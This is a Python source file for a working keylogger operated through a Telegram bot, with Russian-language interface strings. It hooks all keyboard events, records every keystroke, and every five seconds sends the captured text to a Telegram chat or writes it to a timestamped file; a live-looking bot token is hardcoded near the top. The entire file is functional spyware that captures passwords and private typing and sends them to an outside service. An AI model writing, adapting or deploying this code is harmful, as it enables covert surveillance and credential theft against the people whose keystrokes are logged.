import keyboard
from threading import Timer
from datetime import datetime
import telebot
from telebot import types

bot = telebot.TeleBot('6987784435:AAF1w-WWsp78J3YtzLooOU_0mv4oBZ8qCwY')

SEND_REPORT_EVERY = 5

class Keylogger:
    def __init__(self, report_method, chat_id=None):
        self.chat_id = chat_id
        self.report_method = report_method
        self.interval = SEND_REPORT_EVERY
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"Сохранение {self.filename}.txt")

    def send_bot(self, message):
        bot.send_message(self.chat_id, message)

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "telegram":
                self.send_bot(self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

@bot.message_handler(commands=['start'])
def start_bot(message):
    markup = types.InlineKeyboardMarkup()
    run_bot = types.InlineKeyboardButton(text='Запустить bot', callback_data='start_keylogger_tg')
    run_file = types.InlineKeyboardButton(text='Запустить file', callback_data='start_keylogger_file')
    markup.add(run_bot, run_file)
    bot.send_message(message.chat.id,
                     "Чтобы запустить кейлоггер, выберите куда выводить информацию и нажмите на соответствующую кнопку.",
                     reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_worker(call):
    if call.data == 'start_keylogger_tg':
        keylogger = Keylogger(report_method="telegram", chat_id=call.from_user.id)
        keylogger.start()
    elif call.data == 'start_keylogger_file':
        keylogger = Keylogger(report_method="file")
        keylogger.start()

bot.polling()
